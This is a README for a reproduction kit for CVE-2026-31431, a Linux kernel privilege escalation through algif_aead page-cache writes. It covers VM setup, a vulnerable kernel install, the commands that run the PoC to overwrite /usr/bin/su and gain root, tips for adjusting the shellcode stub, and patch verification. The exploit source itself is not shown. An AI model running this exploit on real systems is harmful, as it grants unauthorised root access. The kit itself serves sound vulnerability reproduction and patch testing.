# copy.fail — CVE-2026-31431 reproduction kit

Local privilege escalation via `crypto/algif_aead` in-place page cache write.
An unprivileged local user can overwrite any SUID binary in the page cache
without triggering copy-on-write, then exec it to gain root.

---

## Minimum requirements

| Requirement | Detail |
| --- | --- |
| macOS | 12.2 (Monterey) or later |
| CPU | Apple Silicon (M1+) or Intel with VT-x |
| RAM | 4 GB free (VM takes 2 GB) |
| Disk | 5 GB free |
| Lima | 0.21.0+ |
| lima-additional-guestagents | required for x86_64 guest on Apple Silicon |
| Python | 3.9+ (host, for any local tooling) |

The VM is x86_64 Debian 12 bookworm running under QEMU (`vmType: qemu`, `arch:
x86_64`). On Apple Silicon, QEMU emulates x86_64 hardware; `lima-additional-guestagents`
provides the matching Lima guest agent binary.

---

## Quickstart

```sh
# 1. Install Lima and the x86_64 guest agent support
brew install lima lima-additional-guestagents

# 2. Clone this repo
git clone https://github.com/yourorg/copy_fail ~/git/copy_fail
cd ~/git/copy_fail

# 3. Start the VM (--mount-none keeps host filesystem out of the guest)
limactl start --name=copyfail --mount-none --tty=false copy_fail.yml

# 4. Provision: install vulnerable kernel (6.1.162-1) and reboot
#    --sync . makes the repo directory available inside the VM
limactl shell --sync . copyfail sudo bash provision.sh
# VM reboots automatically. Wait ~30 seconds.

# 5. Verify: confirm vulnerable kernel, run exploit, check page cache
limactl shell --sync . copyfail sudo bash verify.sh
```

Expected output from `verify.sh`:

```text
[INFO] Running kernel: 6.1.0-43-cloud-amd64
[PASS] Vulnerable kernel confirmed: 6.1.0-43-cloud-amd64
[PASS] algif_aead is available (AF_ALG bind succeeded)
[INFO] Magic before: 7f454c46
[INFO] Running exploit as nobody...
[*] target  : /usr/bin/su
[*] payload : 4096 bytes
...
[INFO] Magic after : <changed>
[PASS] Page cache overwritten! CVE-2026-31431 reproduced successfully.
[PASS] /usr/bin/su restored (ELF magic: 7f454c46)
```

### Teardown

```sh
limactl stop copyfail
limactl delete copyfail
```

---

## Debugging / dev

### VM won't start

```sh
# Check Lima logs
limactl start --name=copyfail --mount-none copy_fail.yml 2>&1 | tail -40

# If you see "additional guest agents required":
brew install lima-additional-guestagents
```

`socket_vmnet` is not required — the VM uses QEMU's built-in user-mode networking.

### Stuck after provision.sh reboot

Lima may not reconnect automatically after the VM reboots. Wait 60 seconds,
then:

```sh
limactl shell copyfail uname -r
```

If it hangs, the VM may still be booting. Check:

```sh
limactl list
# STATUS should be "Running"
```

### Wrong kernel after reboot

```sh
limactl shell copyfail -- bash -c 'grep GRUB_DEFAULT /etc/default/grub'
# Should show the 6.1.0-43 entry.

# If not, re-run provision.sh (from the repo root):
limactl shell --sync . copyfail sudo bash provision.sh
```

### apt sources broken inside VM

The base Debian 12 cloud image uses deb822 format with mirror-list
indirection. `provision.sh` rewrites `/etc/apt/sources.list.d/debian.sources`
to point directly at `snapshot.debian.org`. If apt still fails:

```sh
limactl shell copyfail sudo bash
cat /etc/apt/sources.list.d/debian.sources
# Should show snapshot.debian.org URLs, not mirror+file:// lines.

# Manual fix if needed:
apt-get update -o Acquire::Check-Valid-Until=false
```

### Exploit doesn't fire (page cache unchanged)

This is expected if:

- The VM booted into the patched kernel (`6.1.170-1` or later). Check
  `uname -r` and re-run `provision.sh`.
- The `su` binary layout differs from what the shellcode targets. The PoC
  writes to page offset 0; if the ELF entry point is elsewhere the exec
  will segfault rather than spawn a shell. Adjust `STUB_ELF` in
  `copy_fail.py` for your binary.
- `algif_aead` is blocked by a `modprobe.d` rule. Check:
  ```sh
  cat /etc/modprobe.d/*.conf | grep algif
  ```

### Running the exploit standalone (no verify.sh)

```sh
# Inside the VM as an unprivileged user:
python3 /usr/local/bin/copy_fail.py --target /usr/bin/su

# As root (skips the interesting LPE path but still tests the mechanism):
sudo python3 /usr/local/bin/copy_fail.py --target /usr/bin/su
```

### Confirming the patch blocks the attack

```sh
# Inside the VM as root:
apt-get install -y linux-image-6.1.0-45-cloud-amd64   # patched version
update-grub
# Edit /etc/default/grub to set GRUB_DEFAULT to the 6.1.0-45 entry
reboot

# After reboot (from repo root on the host):
limactl shell --sync . copyfail sudo bash verify.sh
# Expect [FAIL] on the page cache check — ELF magic should remain 7f454c46
```

---

## Files

| File | Purpose |
| --- | --- |
| `copy_fail.yml` | Lima VM definition |
| `provision.sh` | Installs vulnerable kernel, configures GRUB, reboots |
| `verify.sh` | Confirms kernel, runs exploit, checks result, restores su |
| `copy_fail.py` | Non-interactive PoC (runs as unprivileged user) |

---

## URLs

| Resource | URL |
| --- | --- |
| CVE detail (NVD) | <https://nvd.nist.gov/vuln/detail/CVE-2026-31431> |
| copy.fail writeup | <https://copy.fail> |
| oss-security disclosure | <https://www.openwall.com/lists/oss-security/2026/04/28/1> |
| Debian DSA-6243-1 | <https://www.debian.org/security/2026/dsa-6243> |
| Vulnerable commit | <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=72548b093ee3> |
| Fix commit | <https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?h=linux-6.1.y> |
| Debian snapshot archive | <https://snapshot.debian.org/archive/debian/> |
| Lima docs | <https://lima-vm.io/docs/> |
| lima-additional-guestagents | <https://github.com/lima-vm/lima-additional-guestagents> |
